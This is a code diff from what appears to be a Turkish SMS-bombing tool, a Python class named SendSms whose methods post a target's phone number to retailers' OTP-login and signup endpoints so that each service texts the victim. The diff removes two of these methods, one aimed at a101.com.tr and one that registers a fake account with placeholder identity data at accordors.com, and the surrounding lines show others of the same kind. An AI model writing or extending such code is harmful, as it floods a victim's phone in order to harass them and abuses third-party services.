@@ -196,20 +196,7 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")
             
-    
-    #a101.com.tr
-    def A101(self):
-        try:
-            url = "https://www.a101.com.tr:443/users/otp-login/"
-            data = {"phone": f"0{self.phone}", "next": "/a101-kapida"}
-            r = requests.post(url,data=data)
-            if (r.status_code) == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> a101.com.tr")
-                self.adet += 1
-            else:
-                raise 
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> a101.com.tr")
+   
 
 
     #englishhome.com
@@ -861,20 +848,6 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> anadolu.com.tr")
             
-            
-    #accordors.com
-    def Accordors(self):
-        try:
-            url = "http://aouws.accordors.com:80/api"
-            json={"apiVersion": "0.1.0", "id": "", "method": "members.new", "params": {"email": self.mail, "firstname": "Memati", "gender": "male", "identityno": "00000000001", "lastname": "Bas", "password": "31ABC..abc31", "phone": self.phone}}
-            r = requests.post(url, json=json)
-            if r.json()["data"]:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> aouws.accordors.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> aouws.accordors.com")
             
         
     #marti.tech
